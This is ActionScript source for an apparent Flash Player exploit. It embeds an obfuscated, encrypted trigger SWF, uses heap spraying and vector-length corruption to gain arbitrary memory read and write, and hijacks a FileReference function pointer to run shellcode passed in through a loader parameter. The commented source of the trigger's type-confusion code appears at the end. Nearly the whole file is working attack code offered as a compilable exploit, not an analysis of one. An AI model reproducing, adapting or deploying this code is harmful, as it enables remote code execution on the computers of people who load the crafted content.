//Compile:  mxmlc.exe Exploit.as -o Exploit.swf

package
{
	import flash.display.Sprite;
	import flash.utils.ByteArray;
	import flash.net.LocalConnection;
	import flash.utils.Endian;
	import flash.net.FileReference;
	import __AS3__.vec.Vector;
	import flash.system.Capabilities;
	import flash.display.Loader;
	import flash.utils.setTimeout;
	
	import flash.display.LoaderInfo;
			
	public class Exploit extends Sprite
	{
		var number_massage_vectors:uint = 0x18000;		
		var len_massage_vector:uint = 0x36;		
		var maxElementsPerPage:uint = 0xe00012;		
		var massage_array:Array;		
		var tweaked_vector;
		var tweaked_vector_address;	
		var done:Boolean = false;		
		var receiver:LocalConnection;	
		// Embedded trigger, ActionScript source available at the end of this file as code comment.		
		var trigger_swf:String = "78da75565f4c9357144ff6b2cca7252ed91e966d2e2c35e0a605bc681d9f11a94f4b85745b05b2f0325c78d3651ad0173666d8941998a2d9f857a0aed8de425b4a59a1a520855908f4cf6de1d2967e03d9a2885127713a37d8b9f7fba0b0cc872fdc9eef777ee79cdf39dfb9343c2b0bf75c43d48cb36a08de5f41f07bb3e4b682128c1a435abf62b93b3f49f0a027fc15ea27e3c52ebd0fb9fbc5230e7b14fdd84f4b5c1db775d88e0b6c5e8abcce91125a3d52ea34f2df5a931e7f6ed3278a5d567f89c743cfba3a964a1d467f3eb5b5a0c1fea1bc25122872b8936a6a1f3a62b58bc864a7a57d7a5ce8edc5451686bb9cd4b9fbfdc7f0e5a1a2ee86d162ec4ca281c171d4e81e2a32b54ce699fa2327781c327ff4823159ea74b420b3939e6a68c067dbaa68becd33f122d5fbf35a2f2fa1ceb691bc3e63f4888724b58039eb218f0a1dee299d83dc2b7342dc2e27fea09d4ce69bc8bd7c13d466230b877b6d90437b5c6b3246510f19d675d68fe6f5da132c87f25e3bf09b71890be2eac944e160ad5c8b63a2a046aea7d7398c1cce1b857800170f905f8b06ec43a7fa3c37b403c6d1222799542f7947746ee74d84ddf7caee1251ebecc3fa0962406204231ae9449498b3a10fc26c40954de35d159a1016e25575fa3562c8146718a67b1da39c857e892166b3fcc7ef3af74b56b1334ed744b012fa898261ab3e460cca2bea2e148caf6dd30c612114c1e06746c0a58ca530d91c1304cc0a16c2525e7ba98c11c32c6617b3e5d0ad7e59dc2fbac6ce077d6a3312a3808d5bd2593e6233cbc750b6a8ee43416af6bf02be7497168904fb6904e68e983381ef8b45750f0a8a12f7ec7a3cc643d8b3099334fb19e6278659fe3f4c2d0ace5d47c104d7660f259da7d97b7191e5df0838c3011fcb57e4b9e7fad42e24ae6ee1c94d696ae69ade845e10625024898ca9572925fd0d399c2bb2c0b8d22edc673e1eae3dab2138c463bc7ddec7eced29fb18b7bf25d937eb34c8e3059a55efd0b843f9183410ef1864dd0dbb792cff6aa566060b237157fa28fbbdd1bb4ee89de15d5f93ea008d5bf75039d7e0d472868662616ca3be3a86dfe9535f871ed422da38688e9126c4e2fa78cdf674cd08e6feeee80b521fe23da7af32fe49f0abb675c7c8ab7ea845188bdc7c0edfb9ad7c707ed2a4ca84b330165065d108d444ee661c0ae11505e3fdc390c96b7bb89021d5e67d5e6dc0f19d90e0bc172b4699fd8141c17dff045f88f32ca07a5ffea6d013822b65db3e1ae9009ba9fce1b3e5375ca70e71bb3fc0f8be81f7b7f40962d81e9c9366e2ca14b39f17a6791c3dc46943c11593ac1f16462fd9d83cecdc9887fba93a57b9cfd71575c3ca6c3a8f19dfcb3cbf49ebe67385661a2b15e01bd9d0e56fa647b5426d84f71bb1784d639cf35bceffa079314d1dc2a729e359b1cadac3f9b17ce673743e5df25bd0cf810e945854ad5be3d42b980fd40b75e706a995eb31cdf5d00b11d003b8f6f998be49f85ef84c9d4bcdd4d3e56d0cbf1650e5d2788db0c2f793e14d9ec7eaea0ea9871ee8a143de1b96f5bd2148bd815e32ecc4ea0ebaeb1ae3cde1dccbedbbf9398ccb6baa273feab14f68cdffa476be62ae19701654d08a0fd2da89e23edb64316d8996e1b6d163de795cd2661d2ea0ec91ee844d7781a8c575f327a8c39fd7d8b2847ea85ad3e2ea645167c390ceabe73d423c9ff042dab8a60b6d27f20e851a673f69473484f70e13aca3640afd4554aad4aee8cc8e7f39a04f92ce9c6048de05c18533a5619c73959d09ef490edf8f33d652d0257316f634bccf0e80b689b061cfc7090c7bb8eb751a1e3ecaeebc6922ef04d0303e63a9bc2ae19487a759bc36fe5d49bba9bbe2f726952069db25506eb3f0fd31d7ccf613ef89f09b0ffb432cdf10cff9a5e971f80bf169eda3e32eeb2f3aaf537cadc1b40677ec8dc23b44bbef0ef42b46d2ced0182ef77a473e747937ddb183517667b347d29c24f2fb8c23796d1d7e761f9f6c6dc0851ee3dd932d70d75e70d2e32677e284c33ea1a69bb51866fbe1335e879cf3cfd304f209f6226ac7f0bfc745a411f1c6ac2542dd9f06d426a641b6bc0ff65e69cd8019b9b5b96fec9ce9eb87f99db140fdf03e3400b30d7d89bebd9fcd4cec29cee935c1fd4ddad7358459efce9c6dba25e12239592c5e94a47672bcf9fb4a4d5cdad9b1f5796896ef5ad8e571f62dc4eb77d04b90ebbffc1db134";
		var key:uint = 3.627461843E9;
		var shellcodeObj:Array;
		
		public function Exploit() {
			var trigger_decrypted:uint = 0;
			super();			
			shellcodeObj = LoaderInfo(this.root.loaderInfo).parameters.sh.split(",");			
			var i:* = 0;
			this.massage_array = new Array();
			
			// Memory massage 
			i = 0;
			while(i < this.number_massage_vectors)
			{
				this.massage_array[i] = new Vector.<int>(1);
				i++;
			}
			i = 0;
			while(i < this.number_massage_vectors)
			{
				this.massage_array[i] = new Vector.<int>(this.len_massage_vector);
				this.massage_array[i][0] = 0x41414141;
				i++;
			}
			var j:* = 0;
			i = 0;
			while(i < this.number_massage_vectors)
			{
				j = 0;
				while(j < 32)
				{
					this.massage_array[i][j] = 0x41414141;
					j++;
				}
				i++;
			}
			var k:uint = (4096 - 32) / (this.len_massage_vector * 4 + 8);
			i = 65536 + 6;
			while(i < this.number_massage_vectors)
			{
				this.massage_array[i] = new Vector.<int>(this.len_massage_vector * 2);
				this.massage_array[i][0] = 0x42424242;
				i = i + k;
			}
			
			// Decompress/Decrypt trigger
			this.receiver = new LocalConnection();
			this.receiver.connect("toAS3");
			this.receiver.client = this;
			var trigger_byte_array:ByteArray = this.createByteArray(this.trigger_swf);
			trigger_byte_array.endian = Endian.LITTLE_ENDIAN;
			trigger_byte_array.uncompress();
			trigger_byte_array.position = 0;
			i = 0;
			while(i < trigger_byte_array.length / 4)
			{
				trigger_decrypted = trigger_byte_array.readUnsignedInt() ^ this.key;
				trigger_byte_array.position = trigger_byte_array.position - 4;
				trigger_byte_array.writeUnsignedInt(trigger_decrypted);
				i++;
			}
			trigger_byte_array.position = 0;
			
			// Trigger corruption
			var trigger_loader:Loader = new Loader();
			trigger_loader.loadBytes(trigger_byte_array);
			
			// Handler to check for corruption
			setTimeout(this.as2loaded,4000,[]);
		}
		
		function createByteArray(hex_string:String) : ByteArray {
			var byte:String = null;
			var byte_array:ByteArray = new ByteArray();
			var hex_string_length:uint = hex_string.length;
			var i:uint = 0;
			while(i < hex_string_length)
			{
				byte = hex_string.charAt(i) + hex_string.charAt(i + 1);
				byte_array.writeByte(parseInt(byte,16));
				i = i + 2;
			}
			return byte_array;
		}
		
		// When param1.length > 0 it's called from the corruption trigger
		// Else it's called because of the timeout trigger
		public function as2loaded(param1:Array) : * {
			var back_offset:* = undefined; // backward offset from the tweaked vector
			var j:* = undefined;
			var _loc15_:uint = 0;
			var ninbets:Array = null;
			var array_with_code:Array = null;
			var address_code:uint = 0;
			var _loc19_:uint = 0;
			if(this.done == true)
			{
				return;
			}			
			if(param1.length > 0)
			{
				this.done = true;
			}			
			var corrupted_index:uint = 0;
			var i:* = 0;
			i = 0x10000 + 6;
			
			// Search corrupted vector
			while(i < this.number_massage_vectors)
			{
				if(this.massage_array[i].length != 2 * this.len_massage_vector)
				{
					if(this.massage_array[i].length != this.len_massage_vector)
					{
						corrupted_index = i;
						this.massage_array[i][0] = 0x41424344;
						break;
					}
				}
				i++;
			}
			
			// throw Error if any vector has been corrupted
			if(i == this.number_massage_vectors)
			{
				throw new Error("not found");
			}			
			else // start the magic...
			{
				// Tweak the length for the vector next to the corrupted one
				this.massage_array[corrupted_index][this.len_massage_vector] = 0x40000001; 
				// Save the reference to the tweaked vector, it'll work with this one to leak and corrupt arbitrary memory
				this.tweaked_vector = this.massage_array[corrupted_index + 1]; 
				var offset_length = 0;
				// Ensure tweaked vector length corruption, I guess the offset to the vector length
				// changes between flash versions
				if(this.tweaked_vector.length != 0x40000001)
				{
					this.massage_array[corrupted_index][this.len_massage_vector + 10] = 0x40000001;
					offset_length = 10;
				}				
				if(param1.length > 0) // From the corruption trigger
				{
					// Fix the massage array of vectors, restores the corrupted vector and
					// marks it as the last one.
					back_offset = (4 * (this.len_massage_vector + 2) - 100) / 4 + this.len_massage_vector + 2; // 87
					j = 0;
					/*
					tweaked_vector->prior->prior, some data is overwritten, is used for search purposes
					tweaked_vector[3fffffa7] = 0
					tweaked_vector[3fffffa8] = 0
					tweaked_vector[3fffffa9] = 1c0340
					tweaked_vector[3fffffaa] = ffffffff
					tweaked_vector[3fffffab] = 0
					tweaked_vector[3fffffac] = 0
					tweaked_vector[3fffffad] = 0
					tweaked_vector[3fffffae] = 0
					tweaked_vector[3fffffaf] = 0
					tweaked_vector[3fffffb0] = 0
					tweaked_vector[3fffffb1] = 0
					tweaked_vector[3fffffb2] = 100
					tweaked_vector[3fffffb3] = 0
					tweaked_vector[3fffffb4] = 0
					tweaked_vector[3fffffb5] = 0
					tweaked_vector[3fffffb6] = 0
					tweaked_vector[3fffffb7] = 100dddce
					tweaked_vector[3fffffb8] = 0
					tweaked_vector[3fffffb9] = 1df6000
					tweaked_vector[3fffffba] = 1dc2380
					tweaked_vector[3fffffbb] = 0
					tweaked_vector[3fffffbc] = 10000
					tweaked_vector[3fffffbd] = 70
					tweaked_vector[3fffffbe] = 0
					tweaked_vector[3fffffbf] = 4
					tweaked_vector[3fffffc0] = 0
					tweaked_vector[3fffffc1] = 1de7090
					tweaked_vector[3fffffc2] = 4
					tweaked_vector[3fffffc3] = 0
					tweaked_vector[3fffffc4] = 0
					tweaked_vector[3fffffc5] = 0
					// tweaked_vector->prior
					tweaked_vector[3fffffc6] = 36 // Length
					tweaked_vector[3fffffc7] = 1dea000
					tweaked_vector[3fffffc8] = 41414141
					tweaked_vector[3fffffc9] = 41414141
					tweaked_vector[3fffffca] = 41414141
					tweaked_vector[3fffffcb] = 41414141
					tweaked_vector[3fffffcc] = 41414141
					tweaked_vector[3fffffcd] = 41414141
					tweaked_vector[3fffffce] = 41414141
					tweaked_vector[3fffffcf] = 41414141
					tweaked_vector[3fffffd0] = 41414141
					tweaked_vector[3fffffd1] = 41414141
					tweaked_vector[3fffffd2] = 41414141
					tweaked_vector[3fffffd3] = 41414141
					tweaked_vector[3fffffd4] = 41414141
					tweaked_vector[3fffffd5] = 41414141
					tweaked_vector[3fffffd6] = 41414141
					tweaked_vector[3fffffd7] = 41414141
					tweaked_vector[3fffffd8] = 41414141
					tweaked_vector[3fffffd9] = 41414141
					tweaked_vector[3fffffda] = 41414141
					tweaked_vector[3fffffdb] = 41414141
					tweaked_vector[3fffffdc] = 41414141
					tweaked_vector[3fffffdd] = 41414141
					tweaked_vector[3fffffde] = 41414141
					tweaked_vector[3fffffdf] = 41414141
					tweaked_vector[3fffffe0] = 41414141
					tweaked_vector[3fffffe1] = 41414141
					tweaked_vector[3fffffe2] = 41414141
					tweaked_vector[3fffffe3] = 41414141
					tweaked_vector[3fffffe4] = 41414141
					tweaked_vector[3fffffe5] = 41414141
					tweaked_vector[3fffffe6] = 41414141
					tweaked_vector[3fffffe7] = 41414141
					tweaked_vector[3fffffe8] = 0
					tweaked_vector[3fffffe9] = 0
					tweaked_vector[3fffffea] = 0
					tweaked_vector[3fffffeb] = 0
					tweaked_vector[3fffffec] = 0
					tweaked_vector[3fffffed] = 0
					tweaked_vector[3fffffee] = 0
					tweaked_vector[3fffffef] = 0
					tweaked_vector[3ffffff0] = 0
					tweaked_vector[3ffffff1] = 0
					tweaked_vector[3ffffff2] = 0
					tweaked_vector[3ffffff3] = 0
					tweaked_vector[3ffffff4] = 0
					tweaked_vector[3ffffff5] = 0
					tweaked_vector[3ffffff6] = 0
					tweaked_vector[3ffffff7] = 0
					tweaked_vector[3ffffff8] = 0
					tweaked_vector[3ffffff9] = 0
					tweaked_vector[3ffffffa] = 0
					tweaked_vector[3ffffffb] = 0
					tweaked_vector[3ffffffc] = 0
					tweaked_vector[3ffffffd] = 0
					*/
					while(j < back_offset)
					{
						this.tweaked_vector[0x40000000 - back_offset - 2 + j - offset_length] = param1[j];
						j++;
					}
					// tweaked_vector[3fffffff] = 1dea000 // Restores tweaked vector metadata
					this.tweaked_vector[0x40000000-1] = param1[back_offset + 1];
					
					
					j = back_offset + 2;
					
					// Modifies the tweaked vector content, and overflow the next ones, they just remain in good state:
					/*
					// tweaked vector content
					tweaked_vector[0] = 41414141
					tweaked_vector[1] = 41414141
					tweaked_vector[2] = 41414141
					tweaked_vector[3] = 41414141
					tweaked_vector[4] = 41414141
					tweaked_vector[5] = 41414141
					tweaked_vector[6] = 41414141
					tweaked_vector[7] = 41414141
					tweaked_vector[8] = 41414141
					tweaked_vector[9] = 41414141
					tweaked_vector[a] = 41414141
					tweaked_vector[b] = 41414141
					tweaked_vector[c] = 41414141
					tweaked_vector[d] = 41414141
					tweaked_vector[e] = 41414141
					tweaked_vector[f] = 41414141
					tweaked_vector[10] = 41414141
					tweaked_vector[11] = 41414141
					tweaked_vector[12] = 41414141
					tweaked_vector[13] = 41414141
					tweaked_vector[14] = 41414141
					tweaked_vector[15] = 41414141
					tweaked_vector[16] = 41414141
					tweaked_vector[17] = 41414141
					tweaked_vector[18] = 41414141
					tweaked_vector[19] = 41414141
					tweaked_vector[1a] = 41414141
					tweaked_vector[1b] = 41414141
					tweaked_vector[1c] = 41414141
					tweaked_vector[1d] = 41414141
					tweaked_vector[1e] = 41414141
					tweaked_vector[1f] = 41414141
					tweaked_vector[20] = 0
					tweaked_vector[21] = 0
					tweaked_vector[22] = 0
					tweaked_vector[23] = 0
					tweaked_vector[24] = 0
					tweaked_vector[25] = 0
					tweaked_vector[26] = 0
					tweaked_vector[27] = 0
					tweaked_vector[28] = 0
					tweaked_vector[29] = 0
					tweaked_vector[2a] = 0
					tweaked_vector[2b] = 0
					tweaked_vector[2c] = 0
					tweaked_vector[2d] = 0
					tweaked_vector[2e] = 0
					tweaked_vector[2f] = 0
					tweaked_vector[30] = 0
					tweaked_vector[31] = 0
					tweaked_vector[32] = 0
					tweaked_vector[33] = 0
					tweaked_vector[34] = 0
					tweaked_vector[35] = 0
					// next to the tweaked vector
					tweaked_vector[36] = 36
					tweaked_vector[37] = 1dea000
					tweaked_vector[38] = 41414141
					tweaked_vector[39] = 41414141
					tweaked_vector[3a] = 41414141
					tweaked_vector[3b] = 41414141
					tweaked_vector[3c] = 41414141
					tweaked_vector[3d] = 41414141
					tweaked_vector[3e] = 41414141
					tweaked_vector[3f] = 41414141
					tweaked_vector[40] = 41414141
					tweaked_vector[41] = 41414141
					tweaked_vector[42] = 41414141
					tweaked_vector[43] = 41414141
					tweaked_vector[44] = 41414141
					tweaked_vector[45] = 41414141
					tweaked_vector[46] = 41414141
					tweaked_vector[47] = 41414141
					tweaked_vector[48] = 41414141
					tweaked_vector[49] = 41414141
					tweaked_vector[4a] = 41414141
					tweaked_vector[4b] = 41414141
					tweaked_vector[4c] = 41414141
					tweaked_vector[4d] = 41414141
					tweaked_vector[4e] = 41414141
					tweaked_vector[4f] = 41414141
					tweaked_vector[50] = 41414141
					tweaked_vector[51] = 41414141
					tweaked_vector[52] = 41414141
					tweaked_vector[53] = 41414141
					tweaked_vector[54] = 41414141
					tweaked_vector[55] = 41414141
					tweaked_vector[56] = 41414141
					tweaked_vector[57] = 41414141
					tweaked_vector[58] = 0
					tweaked_vector[59] = 0
					tweaked_vector[5a] = 0
					tweaked_vector[5b] = 0
					tweaked_vector[5c] = 0
					tweaked_vector[5d] = 0
					tweaked_vector[5e] = 0
					tweaked_vector[5f] = 0
					tweaked_vector[60] = 0
					tweaked_vector[61] = 0
					tweaked_vector[62] = 0
					tweaked_vector[63] = 0
					tweaked_vector[64] = 0
					tweaked_vector[65] = 0
					tweaked_vector[66] = 0
					tweaked_vector[67] = 0
					tweaked_vector[68] = 0
					tweaked_vector[69] = 0
					tweaked_vector[6a] = 0
					tweaked_vector[6b] = 0
					tweaked_vector[6c] = 0
					tweaked_vector[6d] = 0
					// next -> next to the tweaked vector
					tweaked_vector[6e] = 36
					tweaked_vector[6f] = 1dea000
					tweaked_vector[70] = 41414141
					tweaked_vector[71] = 41414141
					tweaked_vector[72] = 41414141
					tweaked_vector[73] = 41414141
					tweaked_vector[74] = 41414141
					tweaked_vector[75] = 41414141
					tweaked_vector[76] = 41414141
					tweaked_vector[77] = 41414141
					tweaked_vector[78] = 41414141
					tweaked_vector[79] = 41414141
					tweaked_vector[7a] = 41414141
					tweaked_vector[7b] = 41414141
					tweaked_vector[7c] = 41414141
					tweaked_vector[7d] = 41414141
					tweaked_vector[7e] = 41414141
					tweaked_vector[7f] = 41414141
					tweaked_vector[80] = 41414141
					tweaked_vector[81] = 41414141
					tweaked_vector[82] = 41414141
					tweaked_vector[83] = 41414141
					tweaked_vector[84] = 41414141
					tweaked_vector[85] = 41414141
					tweaked_vector[86] = 41414141
					tweaked_vector[87] = 41414141
					tweaked_vector[88] = 41414141
					tweaked_vector[89] = 41414141
					tweaked_vector[8a] = 41414141
					tweaked_vector[8b] = 41414141
					tweaked_vector[8c] = 41414141
					tweaked_vector[8d] = 41414141
					tweaked_vector[8e] = 41414141
					tweaked_vector[8f] = 41414141
					tweaked_vector[90] = 0
					tweaked_vector[91] = 0
					tweaked_vector[92] = 0
					tweaked_vector[93] = 0
					tweaked_vector[94] = 0
					tweaked_vector[95] = 0
					tweaked_vector[96] = 0
					tweaked_vector[97] = 0
					tweaked_vector[98] = 0
					tweaked_vector[99] = 0
					tweaked_vector[9a] = 0
					tweaked_vector[9b] = 0
					tweaked_vector[9c] = 0
					tweaked_vector[9d] = 0
					tweaked_vector[9e] = 0
					tweaked_vector[9f] = 0
					tweaked_vector[a0] = 0
					tweaked_vector[a1] = 0
					tweaked_vector[a2] = 0
					tweaked_vector[a3] = 0
					tweaked_vector[a4] = 0
					tweaked_vector[a5] = 0
					*/					
					while(j < param1.length)
					{						
						this.tweaked_vector[j - (back_offset + 2) + offset_length] = param1[j];
						j++;
					}
					// next -> next to the tweaked vector
					// tweaked_vector[a6] = 36					
					// tweaked_vector[a7] = 1dea000
					this.tweaked_vector[2 * (this.len_massage_vector + 2) + this.len_massage_vector + offset_length] = param1[back_offset]; // [166] => 36
					this.tweaked_vector[2 * (this.len_massage_vector + 2) + this.len_massage_vector + 1 + offset_length] = param1[back_offset + 1]; //[167] => 1dea000
				}
				else // From the Timeout trigger; never reached on my tests.
				{
					_loc15_ = this.tweaked_vector[4 * (this.len_massage_vector + 2)-1];
					this.tweaked_vector[0x3fffffff] = _loc15_;
					this.tweaked_vector[0x3fffffff - this.len_massage_vector - 2] = _loc15_;
					this.tweaked_vector[0x3fffffff - this.len_massage_vector - 3] = this.len_massage_vector;
					this.tweaked_vector[this.len_massage_vector + 1] = _loc15_;
					this.tweaked_vector[2 * (this.len_massage_vector + 2)-1] = _loc15_;
					this.tweaked_vector[3 * (this.len_massage_vector + 2)-1] = _loc15_;
					this.tweaked_vector[this.len_massage_vector] = this.len_massage_vector;
					this.tweaked_vector[2 * (this.len_massage_vector + 2) - 2] = this.len_massage_vector;
					this.tweaked_vector[3 * (this.len_massage_vector + 2) - 2] = this.len_massage_vector;
				}
				
				this.massage_array[corrupted_index].length = 256; // :?
				
				// Search backwards to find the massage array metadata
				// It's used to disclose the tweaked vector address
				i = 0;
				var hint = 0;
				while(true)
				{
					hint = this.tweaked_vector[0x40000000 - i];
					if(hint == this.maxElementsPerPage-1) //  0xe00012 - 1
					{
						break;
					}
					i++;
				}
				
				this.tweaked_vector_address = 0; 
				if(this.tweaked_vector[0x40000000 - i - 4] == 0)
				{
					throw new Error("error");
				}
				else
				{
					this.tweaked_vector_address = this.tweaked_vector[0x40000000 - i - 4] + (4 * this.len_massage_vector + 8) + 8 + 4 * offset_length;
					
					// I have not been able to understand this tweak,
					// Maybe not necessary at all...
					i = 0;
					hint = 0;
					while(true)
					{
						hint = this.tweaked_vector[0x40000000 - i];
						if(hint == 0x7e3f0004)
						{
							break;
						}
						i++;
					}
					
					this.tweaked_vector[0x40000000 - i + 1] = 4.294967295E9; // -1 / 0xffffffff					
					// End of maybe not necessary tweak
					
					var file_ref_array = new Array();
					i = 0;
					while(i < 64)
					{
						file_ref_array[i] = new FileReference();
						i++;
					}
					
					var file_reference_address = this.getFileReferenceLocation(this.tweaked_vector, this.tweaked_vector_address);
					var ptr_backup = this.getMemoryAt(this.tweaked_vector, this.tweaked_vector_address, file_reference_address + 32);
					
					// Get array related data, important to trigger the desired corruption to achieve command execution
					ninbets = this.getNinbets(this.tweaked_vector,this.tweaked_vector_address); 
					array_with_code = this.createCodeVectors(0x45454545, 0x90909090); 
					address_code = this.getCodeAddress(this.tweaked_vector, this.tweaked_vector_address, 0x45454545);
					this.fillCodeVectors(array_with_code, address_code);
					this.tweaked_vector[7] = ninbets[0] + 0;
					this.tweaked_vector[4] = ninbets[1];
					this.tweaked_vector[0] = 4096;
					this.tweaked_vector[1] = address_code & 0xfffff000;
					// Corruption
					this.writeMemoryAt(this.tweaked_vector, this.tweaked_vector_address, file_reference_address + 32, this.tweaked_vector_address + 8);
					// Get arbitrary execution
					i = 0;
					while(i < 64)
					{
						file_ref_array[i].cancel();
						i++;
					}
					this.tweaked_vector[7] = address_code;
					i = 0;
					while(i < 64)
					{
						file_ref_array[i].cancel();
						i++;
					}
					// Restore Function Pointer
					this.writeMemoryAt(this.tweaked_vector, this.tweaked_vector_address, file_reference_address + 32, ptr_backup);
						
					return;
				}
			}
		}
		
		// vector: tweaked vector with 0x40000001 length
		// vector_address: address of tweaked vector
		// address: address to read
		function getMemoryAt(vector:Vector.<int>, vector_address:uint, address:uint) : uint {
			if(address >= vector_address)
			{
				return vector[(address - vector_address) / 4];
			}
			return vector[0x40000000 - (vector_address - address) / 4];
		}
		
		// vector: tweaked vector with 0x40000001 length
		// vector_address: address of tweaked vector
		// address: address to write
		// value: value to write
		function writeMemoryAt(vector:Vector.<int>, vector_address:uint, address:uint, value:uint) : * {
			if(address >= vector_address)
			{
				vector[(address - vector_address) / 4] = value;
			}
			else
			{
				vector[0x40000000 - (vector_address - address) / 4] = value;
			}
		}
		
		function getNinbets(vector:*, vector_address:*) : Array {
			var _loc9_:uint = 0;
			var array_related_addr:uint = this.getMemoryAt(vector,vector_address,(vector_address & 0xfffff000) + 0x1c);
			var index_array_related_addr:uint = 0;
			var _loc5_:uint = 0;
			var _loc6_:uint = 0;
			if(array_related_addr >= vector_address)
			{
				index_array_related_addr = (array_related_addr - vector_address) / 4;
			}
			else
			{
				index_array_related_addr = 0x40000000 - (vector_address - array_related_addr) / 4;
			}
			var _loc7_:uint = 0;
			while(true)
			{
				index_array_related_addr--;
				_loc9_ = vector[index_array_related_addr];
				if(_loc9_ == 0xfff870ff)
				{
					_loc7_ = 2;
					break;
				}
				if(_loc9_ == 0xf870ff01)
				{
					_loc7_ = 1;
					break;
				}
				if(_loc9_ == 0x70ff016a) 
				{
					_loc9_ = vector[index_array_related_addr + 1];
					if(_loc9_ == 0xfc70fff8)
					{
						_loc7_ = 0;
						break;
					}
				}
				else
				{
					if(_loc9_ == 0x70fff870)
					{
						_loc7_ = 3;
						break;
					}
				}
			}
			
			_loc5_ = vector_address + 4 * index_array_related_addr - _loc7_;
			index_array_related_addr--;
			var _loc8_:uint = vector[index_array_related_addr];
			if(_loc8_ == 0x16a0424)
			{
				return [_loc5_,_loc6_];
			}
			if(_loc8_ == 0x6a042444)
			{
				return [_loc5_,_loc6_];
			}
			if(_loc8_ == 0x424448b)
			{
				return [_loc5_,_loc6_];
			}
			if(_loc8_ == 0xff016a04)
			{
				return [_loc5_,_loc6_];
			}
			
			_loc6_ = _loc5_ - 6;
			while(true)
			{
				index_array_related_addr--;
				_loc9_ = vector[index_array_related_addr];
				if(_loc9_ == 0x850ff50)
				{
					if(uint(vector[index_array_related_addr + 1]) == 0x5e0cc483)
					{
						_loc7_ = 0;
						break;
					}
				}
				_loc9_ = _loc9_ & 0xffffff00;
				if(_loc9_ == 0x50ff5000)
				{
					if(uint(vector[index_array_related_addr + 1]) == 0xcc48308)
					{
						_loc7_ = 1;
						break;
					}
				}
				_loc9_ = _loc9_ & 0xffff0000;
				if(_loc9_ == 0xff500000)
				{
					if(uint(vector[index_array_related_addr + 1]) == 0xc4830850)
					{
						if(uint(vector[index_array_related_addr + 2]) == 0xc35d5e0c)
						{
							_loc7_ = 2;
							break;
						}
					}
				}
				_loc9_ = _loc9_ & 0xff000000;
				if(_loc9_ == 0x50000000) 
				{
					if(uint(vector[index_array_related_addr + 1]) == 0x830850ff)
					{
						if(uint(vector[index_array_related_addr + 2]) == 0x5d5e0cc4)  
						{
							_loc7_ = 3;
							break;
						}
					}
				}
			}
			
			_loc5_ = vector_address + 4 * index_array_related_addr + _loc7_;
			return [_loc5_,_loc6_];
		}
		
		// vector: tweaked vector with 0x40000001 length
		// address: address of tweaked vector
		function getFileReferenceLocation(vector:*, address:*) : uint {
			var flash_address:uint = this.getMemoryAt(vector,address,(address & 0xfffff000) + 28);
			var _loc4_:uint = 0;
			while(true)
			{
				_loc4_ = this.getMemoryAt(vector,address,flash_address + 8);
				if(_loc4_ == 0x2a0)
				{
					break;
				}
				if(_loc4_ < 0x2a0)
				{
					flash_address = flash_address + 36;
				}
				else
				{
					flash_address = flash_address - 36;
				}
			}
			
			var file_ref_related_addr:uint = this.getMemoryAt(vector,address,flash_address + 12);
			while(this.getMemoryAt(vector,address, file_ref_related_addr + 384) != 0xffffffff)
			{
				if(this.getMemoryAt(vector,address, file_ref_related_addr + 380) == 0xffffffff)
				{
					break;
				}
				file_ref_related_addr = this.getMemoryAt(vector, address, file_ref_related_addr + 8);
			}
			return file_ref_related_addr;
		}
				
		function getCodeAddress(vector:*, vector_addr:*, mark:*) : uint {
			var vector_length_read:uint = 0;
			var vector_code_info_addr:uint = this.getMemoryAt(vector, vector_addr,(vector_addr & 0xfffff000) + 0x1c);
			while(true)
			{
				vector_length_read = this.getMemoryAt(vector, vector_addr, vector_code_info_addr + 8);
				if(vector_length_read == 2032) // code vector length
				{
					break;
				}
				vector_code_info_addr = vector_code_info_addr + 0x24;
			}
			
			var vector_code_contents_addr:uint = this.getMemoryAt(vector, vector_addr, vector_code_info_addr + 0xc);
			while(this.getMemoryAt(vector, vector_addr, vector_code_contents_addr + 0x28) != mark)
			{
				vector_code_contents_addr = this.getMemoryAt(vector, vector_addr, vector_code_contents_addr + 8);
			}
			return vector_code_contents_addr + 0x2c; // Code address, starting at nops after the mark
		}
		
		// Every vector in the array => 7f0 (header = 8; data => 0x7e8)
		function createCodeVectors(mark:uint, nops:uint) : * {
			var array:Array = new Array();
			var i:* = 0;
			while(i < 8)
			{
				array[i] = new Vector.<uint>(2032 / 4 - 8);
				array[i][0] = mark;
				array[i][1] = nops;
				i++;
			}
			return array;
		}
		
		function fillCodeVectors(param1:Array, param2:uint) : * {
			var i:uint = 0;
			var sh:uint=1;
			
			while(i < param1.length)
			{				
				for(var u:String in shellcodeObj)
				{
					param1[i][sh++] = Number(shellcodeObj[u]); 
				}
				i++;
				sh = 1;
			}
		}

	}
}

// Trigger's ActionScript

/*

// Action script...

// [Action in Frame 1]
var b = new flash.display.BitmapData(4, 7);
var filt = new flash.filters.DisplacementMapFilter(b, new flash.geom.Point(1, 2), 1, 2, 3, 4);
var b2 = new flash.display.BitmapData(256, 512);
var filt2 = new flash.filters.DisplacementMapFilter(b2, new flash.geom.Point(1, 2), 1, 2, 3, 4);
var colors = [16777215, 16711680, 16776960, 52479];
var alphas = [0, 1, 1, 1];
var ratios = [0, 63, 126, 255];
var ggf = new flash.filters.GradientGlowFilter(0, 45, colors, alphas, ratios, 55, 55, 2.500000, 2, "outer", false);
var cmf = new flash.filters.ColorMatrixFilter([]);
MyString2.setCMF(cmf);
MyString1.setGGF(ggf);
flash.filters.ColorMatrixFilter.prototype.resetMe = _global.ASnative(2106, 302);
zz = MyString1;
flash.display.BitmapData = zz;
arr = new Array();
var i = 0;
while (i < 8192)
{
	arr[i] = new Number(0);
	++i;
} // end while
var i = 100;
while (i < 8192)
{
	arr[i] = "qwerty";
	i = i + 8;
} // end while
k = filt.mapBitmap;
zz = MyString2;
flash.display.BitmapData = zz;
k = filt.mapBitmap;
cmf_matrix = cmf.matrix;
cmf_matrix[4] = 8192;
cmf_matrix[15] = 12.080810;
cmf.matrix = cmf_matrix;
ggf_colors = ggf.colors;
ggf_alphas = ggf.alphas;
mem = new Array();
var i = 0;
while (i < ggf_alphas.length)
{
	ggf_alphas[i] = ggf_alphas[i] * 255;
	++i;
} // end while
for (i = 0; i < ggf_colors.length; i++)
{
	mem[i] = ggf_colors[i] + ggf_alphas[i] * 16777216;
} // end of for
ggf.colors = colors;
ggf.alphas = alphas;
ggf.ratios = ratios;
var lc = new LocalConnection();
lc.send("toAS3", "as2loaded", mem); 
zz = cmf;
zz.resetMe("b", 1, 1, 1);


class MyString1 extends String
{
	static var ggf;
	function MyString(a,b)
	{
		super();
	}
	
	static function setGGF(myggf)
	{
		ggf = myggf;
	}
	
	static function getGGF()
	{
		return (MyString1.ggf);
	}
}

